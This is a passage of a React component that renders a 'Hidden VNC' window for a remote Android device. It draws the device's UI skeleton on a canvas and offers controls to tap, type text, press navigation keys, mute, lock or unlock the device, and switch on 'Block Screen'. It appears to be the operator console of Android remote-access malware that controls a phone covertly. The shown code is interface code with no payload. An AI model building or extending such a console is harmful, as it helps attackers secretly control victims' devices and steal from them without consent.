    const canvas = canvasRef.current;
    const ctx = canvas.getContext("2d");
    if (!ctx) {
      console.error("❌ [HiddenVNC] Failed to get canvas context");
      return;
    }

    const container = containerRef.current;
    
    // Wait for container to have dimensions
    if (container.clientWidth === 0 || container.clientHeight === 0) {
      console.log("⏸️ [HiddenVNC] Container has no dimensions, waiting...");
      // Retry after a short delay
      const timeout = setTimeout(() => {
        if (skeletonData && canvasRef.current && containerRef.current) {
          // Force re-render by updating state
          setSkeletonData({ ...skeletonData });
        }
      }, 100);
      return () => clearTimeout(timeout);
    }
    
    // Get device dimensions from skeleton data
    const deviceWidth = skeletonData.device_width || 1080;
    const deviceHeight = skeletonData.device_height || 2400;
    
    // Calculate device aspect ratio
    const deviceAspectRatio = deviceWidth / deviceHeight;
    
    // Use larger container width for bigger screen display (stretched screen)
    // phoneWidth - 8px total padding (4px * 2) - 4px bezel padding (2px * 2) = screen width
    const maxContainerWidth = phoneWidth - 12;
    
    // Calculate container height based on device aspect ratio to maintain proportions
    const maxContainerHeight = Math.round(maxContainerWidth / deviceAspectRatio);
    
    // Use container dimensions that match device aspect ratio
    const containerWidth = maxContainerWidth;
    const containerHeight = maxContainerHeight;

    console.log("📐 [HiddenVNC] Container dimensions:", {
      containerWidth,
      containerHeight,
      deviceWidth,
      deviceHeight,
      deviceAspectRatio,
      clientWidth: container.clientWidth,
      clientHeight: container.clientHeight
    });

    // Use container dimensions directly for perfect alignment
    const canvasWidth = containerWidth;
    const canvasHeight = containerHeight;
    
    // Store screen height for container div
    setScreenHeight(canvasHeight);
    
    // Calculate the status bar and nav bar heights first
    const statusBarHeightCalc = Math.round(canvasHeight * 0.04);
    const navBarHeightCalc = Math.round(canvasHeight * 0.06);
    
    // Available screen height for actual content (excluding status and nav bars)
    const availableScreenHeight = canvasHeight - statusBarHeightCalc - navBarHeightCalc;
    
    // Calculate scale factors based on device dimensions and available screen area
    // Use uniform scaling to maintain aspect ratio
    const scaleX = canvasWidth / deviceWidth;
    const scaleY = availableScreenHeight / deviceHeight;
    
    // Use the smaller scale to ensure nothing gets cut off
    const uniformScale = Math.min(scaleX, scaleY);

    console.log("📐 [HiddenVNC] Canvas dimensions:", {
      canvasWidth,
      canvasHeight,
      scaleX,
      scaleY,
      uniformScale,
      deviceWidth,
      deviceHeight,
      deviceAspectRatio
    });

    // Set canvas dimensions
    canvas.width = canvasWidth;
    canvas.height = canvasHeight;
    
    // Set CSS size to match
    canvas.style.width = `${canvasWidth}px`;
    canvas.style.height = `${canvasHeight}px`;

    // Clear canvas with Android-like background
    ctx.clearRect(0, 0, canvasWidth, canvasHeight);
    
    // Draw Android status bar area (top) - sleek gradient
    const statusBarHeight = Math.round(canvasHeight * 0.04); // 4% of screen height
    const statusGradient = ctx.createLinearGradient(0, 0, 0, statusBarHeight);
    statusGradient.addColorStop(0, "#1a1a1a");
    statusGradient.addColorStop(1, "#0a0a0a");
    ctx.fillStyle = statusGradient;
    ctx.fillRect(0, 0, canvasWidth, statusBarHeight);
    
    // Draw status bar content - better aligned with glow
    ctx.fillStyle = "#e5e5e5";
    ctx.font = `bold ${Math.round(statusBarHeight * 0.5)}px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif`;
    ctx.textAlign = "left";
    ctx.textBaseline = "middle";
    ctx.fillText("9:41", 16, statusBarHeight / 2);
    
    // Battery icon on right - with gradient fill
    const batteryWidth = 24;
    const batteryHeight = 12;
    const batteryX = canvasWidth - batteryWidth - 16;
    const batteryY = (statusBarHeight - batteryHeight) / 2;
    
    ctx.strokeStyle = "#e5e5e5";
    ctx.lineWidth = 1.5;
    ctx.strokeRect(batteryX, batteryY, batteryWidth, batteryHeight);
    ctx.fillStyle = "#e5e5e5";
    ctx.fillRect(batteryX + batteryWidth, batteryY + 3, 2, batteryHeight - 6);
    
    // Battery fill with gradient
    const batteryGradient = ctx.createLinearGradient(batteryX, 0, batteryX + batteryWidth, 0);
    batteryGradient.addColorStop(0, "#4ade80");
    batteryGradient.addColorStop(1, "#22c55e");
    ctx.fillStyle = batteryGradient;
    ctx.fillRect(batteryX + 2, batteryY + 2, batteryWidth * 0.7, batteryHeight - 4);
    
    // Signal bars - with gradient
    const signalX = batteryX - 40;
    for (let i = 0; i < 4; i++) {
      const barHeight = 3 + (i * 2);
      const barX = signalX + (i * 5);
      const barY = statusBarHeight / 2 + (12 - barHeight) / 2;
      ctx.fillStyle = i < 3 ? "#e5e5e5" : "#4ade80";
      ctx.fillRect(barX, barY, 3, barHeight);
    }
    
    // Draw Android navigation bar area (bottom) - properly aligned
    const navBarHeight = Math.round(canvasHeight * 0.06); // 6% of screen height
    const navBarY = canvasHeight - navBarHeight;
    
    // Main screen area (below status bar, above nav bar)
    const screenStartY = statusBarHeight;
    const screenHeight = navBarY - statusBarHeight;
    
    // Draw main screen background with subtle gradient
    const screenGradient = ctx.createLinearGradient(0, screenStartY, 0, navBarY);
    screenGradient.addColorStop(0, "#0a0a0a");
    screenGradient.addColorStop(0.5, "#000000");
    screenGradient.addColorStop(1, "#0a0a0a");
    ctx.fillStyle = screenGradient;
    ctx.fillRect(0, screenStartY, canvasWidth, screenHeight);

    // Draw skeleton views (offset by status bar)
    if (Array.isArray(skeletonData.skeleton) && skeletonData.skeleton.length > 0) {
      console.log(`🎨 [HiddenVNC] Drawing ${skeletonData.skeleton.length} skeleton entries`);
      console.log(`🎨 [HiddenVNC] Screen area:`, {
        screenStartY,
        screenHeight,
        canvasWidth,
        canvasHeight,
        uniformScale,
        deviceWidth,
        deviceHeight
      });
      
      let drawnCount = 0;
      skeletonData.skeleton.forEach((entry: SkeletonEntry, index: number) => {
        // Scale and position the view using uniform scale to prevent clipping
        const x = Math.round(entry.x * uniformScale);
        const y = Math.round(entry.y * uniformScale) + screenStartY; // Offset by status bar
        const width = Math.round(entry.width * uniformScale);
        const height = Math.round(entry.height * uniformScale);
        
        // Clamp to visible screen area to prevent overflow
        const clampedX = Math.max(0, Math.min(x, canvasWidth));
        const clampedY = Math.max(screenStartY, Math.min(y, navBarY));
        const clampedWidth = Math.min(width, canvasWidth - clampedX);
        const clampedHeight = Math.min(height, navBarY - clampedY);

        // Skip if dimensions are invalid or out of bounds
        if (clampedWidth <= 0 || clampedHeight <= 0) {
          if (index < 5) {
            console.log(`⏭️ [HiddenVNC] Skipping entry ${index} - invalid or out of bounds:`, {
              original: { x, y, width, height },
              clamped: { x: clampedX, y: clampedY, width: clampedWidth, height: clampedHeight }
            });
          }
          return;
        }
        
        if (index < 5) {
          console.log(`🎨 [HiddenVNC] Drawing entry ${index}:`, {
            type: entry.type,
            text: entry.text?.substring(0, 20),
            original: { x: entry.x, y: entry.y, width: entry.width, height: entry.height },
            scaled: { x, y, width, height },
            clamped: { x: clampedX, y: clampedY, width: clampedWidth, height: clampedHeight },
            borderColor: getViewTypeBorderColor(entry.type, index)
          });
        }

        // Draw clean border without glow using clamped dimensions
        const borderColor = getViewTypeBorderColor(entry.type, index);
        
        ctx.strokeStyle = borderColor;
        ctx.lineWidth = 2;
        ctx.strokeRect(clampedX, clampedY, clampedWidth, clampedHeight);
        
        drawnCount++;

        // Draw text if available - clean without shadow using clamped dimensions
        if (entry.text && entry.text.trim() && clampedWidth > 20 && clampedHeight > 15) {
          const fontSize = Math.max(10, Math.min(14, clampedWidth / 15));
          ctx.font = `500 ${fontSize}px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif`;
          ctx.textAlign = "left";
          ctx.textBaseline = "top";
          
          // Truncate text if too long
          const maxWidth = clampedWidth - 8;
          let displayText = entry.text;
          const metrics = ctx.measureText(displayText);
          if (metrics.width > maxWidth) {
            // Truncate text
            let truncated = "";
            for (let i = 0; i < displayText.length; i++) {
              const testText = displayText.substring(0, i + 1) + "...";
              if (ctx.measureText(testText).width > maxWidth) {
                truncated = displayText.substring(0, i) + "...";
                break;
              }
            }
            displayText = truncated || displayText.substring(0, 10) + "...";
          }
          
          ctx.fillStyle = "#f5f5f5";
          ctx.fillText(displayText, clampedX + 6, clampedY + 6);
        }

        // Draw type label (smaller, in corner) with matching border color using clamped dimensions
        if (clampedWidth > 30 && clampedHeight > 15) {
          const labelFontSize = Math.max(7, Math.min(9, clampedWidth / 30));
          ctx.font = `bold ${labelFontSize}px monospace`;
          ctx.textAlign = "right";
          ctx.textBaseline = "bottom";
          ctx.fillStyle = borderColor;
          ctx.fillText(entry.type, clampedX + clampedWidth - 4, clampedY + clampedHeight - 4);
        }
      });
      
      console.log(`✅ [HiddenVNC] Successfully drew ${drawnCount} out of ${skeletonData.skeleton.length} skeleton entries`);
    } else {
      console.warn("⚠️ [HiddenVNC] No skeleton entries to draw:", {
        skeleton: skeletonData.skeleton,
        length: Array.isArray(skeletonData.skeleton) ? skeletonData.skeleton.length : "N/A",
        type: typeof skeletonData.skeleton
      });
    }
    
    // Draw Android navigation bar area (bottom) - with gradient
    const navGradient = ctx.createLinearGradient(0, navBarY, 0, canvasHeight);
    navGradient.addColorStop(0, "#0a0a0a");
    navGradient.addColorStop(1, "#1a1a1a");
    ctx.fillStyle = navGradient;
    ctx.fillRect(0, navBarY, canvasWidth, navBarHeight);
    
    // Draw navigation gesture bar (modern Android style) - clean
    const gestureBarWidth = 120;
    const gestureBarHeight = 4;
    const gestureBarX = (canvasWidth - gestureBarWidth) / 2;
    const gestureBarY = navBarY + (navBarHeight - gestureBarHeight) / 2;
    
    ctx.fillStyle = "#6b7280";
    ctx.beginPath();
    ctx.roundRect(gestureBarX, gestureBarY, gestureBarWidth, gestureBarHeight, 2);
    ctx.fill();

    // Cancel any pending animation frame
    if (animationFrameRef.current) {
      cancelAnimationFrame(animationFrameRef.current);
    }
  }, [skeletonData, isConnected, phoneWidth]);

  return (
    <>

      {/* Draggable Popup Window - Rendered via Portal for persistence */}
      {mounted && isPopupOpen && typeof document !== 'undefined' && document.body && createPortal(
        <>
          <div
            ref={popupRef}
            onClick={(e) => {
              // Only stop propagation if clicking on the container itself, not on buttons
              if (e.target === e.currentTarget) {
                e.stopPropagation();
              }
            }}
            className={`fixed z-50 bg-card ${
              isMinimized ? "h-auto" : ""
            } ${isDragging ? "scale-[1.02]" : "scale-100"}`}
            style={{
              left: `${position.x}px`,
              top: `${position.y}px`,
              width: isMinimized ? "280px" : "auto",
              maxWidth: "95vw",
              maxHeight: "95vh",
              cursor: isDragging ? "grabbing" : "default",
              transition: isDragging ? "none" : "transform 0.2s ease-out",
              willChange: isDragging ? "transform" : "auto",
            }}
          >
          
          {/* Minimized State */}
          {isMinimized ? (
            <div className="p-2 bg-muted/30 rounded flex items-center justify-between gap-2">
              <div className="flex items-center gap-2">
                <EyeOff className="h-4 w-4" />
                <span className="text-xs font-semibold">Hidden VNC - {device.name}</span>
              </div>
              <div className="flex items-center gap-1">
                <Button
                  variant="ghost"
                  size="sm"
                  className="h-6 w-6 p-0 hover:bg-muted cursor-move"
                  onMouseDown={(e) => {
                    e.preventDefault();
                    e.stopPropagation();
                    if (!popupRef.current) return;
                    const rect = popupRef.current.getBoundingClientRect();
                    setDragOffset({
                      x: e.clientX - rect.left,
                      y: e.clientY - rect.top,
                    });
                    setIsDragging(true);
                  }}
                  title="Move Window"
                >
                  <GripVertical className="h-3 w-3" />
                </Button>
                <Button
                  variant="ghost"
                  size="sm"
                  className="h-6 w-6 p-0 hover:bg-muted"
                  onClick={(e) => {
                    e.stopPropagation();
                    setIsMinimized(false);
                  }}
                  title="Maximize"
                >
                  <Maximize2 className="h-3 w-3" />
                </Button>
              </div>
            </div>
          ) : (
          
          /* Window Content - Compact */
          (
            <div className="relative p-1 space-y-1.5">
              {/* Screen Display - Compact */}
              {!isConnected ? (
                <div className="w-full mx-auto aspect-[9/19.5] bg-gradient-to-br from-muted/50 to-muted rounded-xl flex items-center justify-center border-2 border-dashed border-primary/20 relative overflow-hidden" style={{ maxWidth: `${phoneWidth}px` }}>
                  <div className="absolute inset-0 bg-gradient-to-tr from-purple-500/5 via-pink-500/5 to-purple-500/5 animate-pulse" />
                  
                  <div className="relative text-center text-muted-foreground space-y-3 px-4">
                    <div className="relative inline-block">
                      <div className="absolute inset-0 bg-primary/20 rounded-full blur-xl animate-pulse" />
                      <EyeOff className="relative h-12 w-12 mx-auto text-primary/60" />
                    </div>
                    <div className="space-y-1">
                      <p className="text-sm font-semibold">
                        {(isLoading || isAutoConnecting) ? "Wait connecting..." : "Ready to Connect"}
                      </p>
                      <p className="text-xs text-muted-foreground/70">
                        {(isLoading || isAutoConnecting) ? "Please wait..." : "Tap Connect to start"}
                      </p>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-1.5">
                  <div
                    ref={containerRef}
                    className="flex items-center gap-2 p-2"
                  >
                    {/* Screen with Device Name and Text Input */}
                    <div className="flex flex-col gap-1">
                      {/* Heading and Device Name - Top */}
                      <div 
                        className="px-2 py-1 text-center cursor-move"
                        onMouseDown={handleMouseDown}
                      >
                        <h2 className="text-sm font-bold">Hidden VNC - {device.name}</h2>
                      </div>
                      
                      {/* Simple Rectangle Display - Just thin border */}
                      <div 
                        className="relative border border-border"
                        style={{
                          width: `${phoneWidth}px`,
                          height: screenHeight ? `${screenHeight}px` : "600px",
                        }}
                      >
                      {isLoading && !skeletonData ? (
                        <div className="absolute inset-0 flex flex-col items-center justify-center bg-black text-gray-300">
                          <Loader2 className="h-12 w-12 mb-4 animate-spin opacity-50" />
                          <p className="text-sm">Loading skeleton data...</p>
                          <p className="text-xs mt-2 text-gray-400">Waiting for data from device...</p>
                        </div>
                      ) : skeletonData && Array.isArray(skeletonData.skeleton) && skeletonData.skeleton.length > 0 ? (
                        <canvas
                          ref={canvasRef}
                          className="block w-full h-full cursor-pointer touch-none select-none"
                          style={{
                            display: "block",
                            width: "100%",
                            height: "100%",
                            backgroundColor: "#000000",
                          }}
                          onMouseDown={handleCanvasMouseDown}
                          onMouseUp={handleCanvasMouseUp}
                          onMouseLeave={handleCanvasMouseUp}
                          onTouchStart={handleCanvasTouchStart}
                          onTouchEnd={handleCanvasTouchEnd}
                        />
                      ) : (
                        <div className="absolute inset-0 flex flex-col items-center justify-center bg-black text-gray-300">
                          <EyeOff className="h-12 w-12 mb-4 opacity-50" />
                          <p className="text-sm">Waiting for skeleton data...</p>
                          {skeletonData && (
                            <p className="text-xs mt-2 text-red-400">
                              Data received but skeleton is {Array.isArray(skeletonData.skeleton) ? `empty (${skeletonData.skeleton.length} items)` : `not an array (${typeof skeletonData.skeleton})`}
                            </p>
                          )}
                        </div>
                      )}
                      </div>
                      
                      {/* Text Input - Bottom */}
                      {isConnected && (
                        <div className="flex gap-1" style={{ width: `${phoneWidth}px` }}>
                          <Input
                            type="text"
                            placeholder="Type text..."
                            value={textInput}
                            onChange={(e) => setTextInput(e.target.value)}
                            onKeyDown={(e) => {
                              if (e.key === 'Enter') {
                                handleSendText();
                              }
                            }}
                            className="h-8 text-xs flex-1"
                          />
                          <Button
                            variant="default"
                            size="sm"
                            onClick={handleSendText}
                            disabled={!textInput.trim()}
                            className="h-8 px-3"
                            title="Send"
                          >
                            <Send className="h-3.5 w-3.5" />
                          </Button>
                        </div>
                      )}
                    </div>
                    
                    {/* Device Control Toolbar - Super Compact Horizontally */}
                    <div className="flex flex-col gap-1 bg-muted/20 border p-1 h-full overflow-y-auto w-[50px]">
                      {/* Window Controls */}
                      <Button
                        variant="ghost"
                        size="sm"
                        className="h-8 w-full p-0 hover:bg-muted"
                        onClick={(e) => {
                          e.stopPropagation();
                          setIsMinimized(!isMinimized);
                        }}
                        title={isMinimized ? "Maximize" : "Minimize"}
                      >
                        {isMinimized ? (
                          <Maximize2 className="h-4 w-4" />
                        ) : (
                          <Minimize2 className="h-4 w-4" />
                        )}
                      </Button>
                      <Button
                        type="button"
                        variant="ghost"
                        size="sm"
                        className="h-8 w-full p-0 hover:bg-destructive hover:text-destructive-foreground"
                        onClick={(e) => {
                          e.preventDefault();
                          e.stopPropagation();
                          setIsPopupOpen(false);
                          setIsConnected(false);
                          setSkeletonData(null);
                          if (onViewSelect) {
                            setTimeout(() => {
                              onViewSelect(null);
                            }, 100);
                          }
                        }}
                        title="Close"
                      >
                        <X className="h-4 w-4" />
                      </Button>
                      
                      <div className="h-px w-full bg-border/50" />
                      
                      {/* Move Window Button */}
                      <Button
                        variant="ghost"
                        size="sm"
                        className="h-10 w-full p-0 hover:bg-muted cursor-move"
                        onMouseDown={(e) => {
                          e.preventDefault();
                          e.stopPropagation();
                          if (!popupRef.current) return;
                          const rect = popupRef.current.getBoundingClientRect();
                          setDragOffset({
                            x: e.clientX - rect.left,
                            y: e.clientY - rect.top,
                          });
                          setIsDragging(true);
                        }}
                        title="Move Window (Drag)"
                      >
                        <GripVertical className="h-4 w-4" />
                      </Button>
                      
                      {/* Resize Controls */}
                      <div className="flex gap-0.5">
                        <Button
                          variant="ghost"
                          size="sm"
                          className="h-8 w-1/2 p-0 hover:bg-muted text-sm font-bold"
                          onClick={(e) => {
                            e.stopPropagation();
                            setPhoneWidth(Math.max(300, phoneWidth - 50));
                          }}
                          title="Decrease Size"
                        >
                          -
                        </Button>
                        <Button
                          variant="ghost"
                          size="sm"
                          className="h-8 w-1/2 p-0 hover:bg-muted text-sm font-bold"
                          onClick={(e) => {
                            e.stopPropagation();
                            setPhoneWidth(Math.min(800, phoneWidth + 50));
                          }}
                          title="Increase Size"
                        >
                          +
                        </Button>
                      </div>
                      
                      <div className="h-px w-full bg-border/50" />
                      
                      {/* Connection Controls */}
                      {!isConnected ? (
                        <Button 
                          onClick={(e) => {
                            e.stopPropagation();
                            handleConnect();
                          }}
                          size="sm" 
                          className="h-10 w-full p-0 bg-purple-600 hover:bg-purple-700 text-white"
                          title="Connect"
                        >
                          <Power className="h-4 w-4" />
                        </Button>
                      ) : (
                        <>
                          <Button
                            variant="outline"
                            onClick={(e) => {
                              e.stopPropagation();
                              handleDisconnect();
                            }}
                            size="sm"
                            className="h-10 w-full p-0 hover:bg-destructive/10"
                            title="Disconnect"
                          >
                            <Power className="h-4 w-4" />
                          </Button>
                          <Button
                            variant="outline"
                            onClick={(e) => {
                              e.stopPropagation();
                              handleRefresh();
                            }}
                            size="sm"
                            disabled={isLoading}
                            className="h-10 w-full p-0"
                            title="Refresh"
                          >
                            {isLoading ? (
                              <Loader2 className="h-4 w-4 animate-spin" />
                            ) : (
                              <RotateCcw className="h-4 w-4" />
                            )}
                          </Button>
                        </>
                      )}
                      
                      <div className="h-px w-full bg-border/50" />
                      
                      {/* Spacer */}
                      <div className="flex-1 min-h-[20px]" />
                      
                      {isConnected && (
                        <>
                        {/* Arrow Keys Grid - Narrow */}
                        <div className="grid grid-cols-3 gap-0.5">
                          <div></div>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={handleArrowUp}
                            className="h-6 w-full p-0 hover:bg-muted"
                            title="Up"
                          >
                            <ArrowUp className="h-4 w-4" />
                          </Button>
                          <div></div>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={handleArrowLeft}
                            className="h-6 w-full p-0 hover:bg-muted"
                            title="Left"
                          >
                            <ArrowLeft className="h-4 w-4" />
                          </Button>
                          <div></div>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={handleArrowRight}
                            className="h-6 w-full p-0 hover:bg-muted"
                            title="Right"
                          >
                            <ArrowRight className="h-4 w-4" />
                          </Button>
                          <div></div>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={handleArrowDown}
                            className="h-6 w-full p-0 hover:bg-muted"
                            title="Down"
                          >
                            <ArrowDown className="h-4 w-4" />
                          </Button>
                          <div></div>
                        </div>
                        
                        <div className="h-px w-full bg-border/50" />
                        
                        {/* Navigation Buttons */}
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={handleBack}
                          className="h-8 w-full p-0 hover:bg-muted"
                          title="Back"
                        >
                          <ArrowLeft className="h-4 w-4" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={handleHome}
                          className="h-8 w-full p-0 hover:bg-muted"
                          title="Home"
                        >
                          <Home className="h-4 w-4" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={handleRecent}
                          className="h-8 w-full p-0 hover:bg-muted"
                          title="Recent"
                        >
                          <div className="h-4 w-4 flex flex-col gap-0.5 justify-center">
                            <div className="h-0.5 w-full bg-current"></div>
                            <div className="h-0.5 w-full bg-current"></div>
                            <div className="h-0.5 w-full bg-current"></div>
                          </div>
                        </Button>
                        
                        <div className="h-px w-full bg-border/50" />
                        
                        {/* Spacer */}
                        <div className="flex-1 min-h-[20px]" />
                        
                        {/* Volume Buttons */}
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={handleVolumeUp}
                          className="h-8 w-full p-0 hover:bg-muted"
                          title="Vol +"
                        >
                          <Volume2 className="h-4 w-4" />
                        </Button>
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={handleVolumeDown}
                          className="h-8 w-full p-0 hover:bg-muted"
                          title="Vol -"
                        >
                          <Volume1 className="h-4 w-4" />
                        </Button>
                        
                        {/* Mute/Unmute Toggle */}
                        <Button
                          variant={isMuted ? "default" : "ghost"}
                          size="sm"
                          onClick={handleToggleMute}
                          className="h-8 w-full p-0 hover:bg-muted"
                          title={isMuted ? "Unmute" : "Mute"}
                        >
                          {isMuted ? <MicOff className="h-4 w-4" /> : <Mic className="h-4 w-4" />}
                        </Button>
                        
                        {/* Lock/Unlock Toggle */}
                        <Button
                          variant={isLocked ? "default" : "ghost"}
                          size="sm"
                          onClick={handleToggleLock}
                          className="h-8 w-full p-0 hover:bg-muted"
                          title={isLocked ? "Unlock" : "Lock"}
                        >
                          {isLocked ? <Lock className="h-4 w-4" /> : <Unlock className="h-4 w-4" />}
                        </Button>
                        
                        <div className="h-px w-full bg-border/50" />
                        
                        {/* Block Screen Toggle */}
                        <div className="px-1 py-1.5 flex flex-col items-center justify-center gap-1">
                          <Lock className="h-3 w-3 text-muted-foreground" />
                          <Switch
                            checked={blockScreenEnabled}
                            onCheckedChange={handleBlockScreenToggle}
                            className="scale-75"
                            title="Block Screen"
                          />
                        </div>
                        
                        </>
                      )}
                    </div>
                  </div>
                </div>
              )}
            </div>
          )
          )}
        </div>
        </>,
        document.body
      )}
    </>
  );
}
